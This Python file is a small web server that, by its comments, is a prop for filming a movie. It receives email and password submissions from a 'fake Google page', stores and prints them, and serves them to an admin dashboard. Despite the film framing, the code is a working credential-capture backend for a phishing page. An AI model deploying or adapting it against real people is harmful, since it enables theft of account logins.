import http.server
import socketserver
import json
import time
import os

PORT = 5000

# Fake database in memory. Clears when the server stops.
captured_credentials = []

class MovieServer(http.server.SimpleHTTPRequestHandler):
    
    # Prevents the "Address already in use" error when restarting quickly
    allow_reuse_address = True 

    def do_GET(self):
        # 1. API Endpoint: The admin dashboard asks for data here
        if self.path == '/api/accounts':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(captured_credentials).encode('utf-8'))
            return

        # 2. Serve Frontend Pages
        # If user goes to root, serve index.html
        if self.path == '/':
            self.path = '/static/index.html'
        
        # Handle paths for your specific folder structure
        # CSS and IMG are in the root 'practice' folder, HTML is in 'static'
        if self.path.startswith('/css/') or self.path.startswith('/img/'):
            self.path = '.' + self.path
        elif self.path.endswith('.html'):
            self.path = '/static' + self.path
            
        return super().do_GET()

    def do_POST(self):
        # 3. API Endpoint: The fake Google page sends data here
        if self.path == '/api/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            new_entry = {
                'email': data.get('email'),
                'password': data.get('password'),
                'ip': '192.168.1.100', # Fake IP for the movie
                'time': time.strftime("%I:%M:%S %p")
            }
            
            # Add to top of list
            captured_credentials.insert(0, new_entry)
            
            # Print to terminal so you can see it working
            print(f"\n[!] CAPTURED: {new_entry['email']} | {new_entry['password']}\n")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            return

# Change directory to the script's directory to ensure paths work
os.chdir(os.path.dirname(os.path.abspath(__file__)))

# We use ThreadingTCPServer so multiple laptops can connect at once
# without freezing each other during the shoot.
class ThreadingServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

with ThreadingServer(("", PORT), MovieServer) as httpd:
    print(f"Server started at http://127.0.0.1:{PORT}")
    print("Press Ctrl+C to stop.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")